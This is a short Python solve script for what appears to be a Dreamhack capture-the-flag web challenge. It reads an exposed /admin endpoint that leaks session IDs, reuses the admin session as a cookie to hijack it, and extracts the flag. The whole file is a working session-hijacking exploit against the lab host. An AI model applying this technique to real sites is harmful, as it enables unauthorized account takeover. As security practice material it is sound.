import requests
import json
import re

HOST = "http://host1.dreamhack.games"
PORT = 20599

sessionid = ""
res = json.loads(requests.get(f"{HOST}:{PORT}/admin").text)
for k, v in res.items():
    if v == "admin":
        sessionid = k
        break

res = requests.get(f"{HOST}:{PORT}/", cookies={"sessionid": sessionid})
flag = re.search(r"DH{.*}", res.text).group()
print(flag)
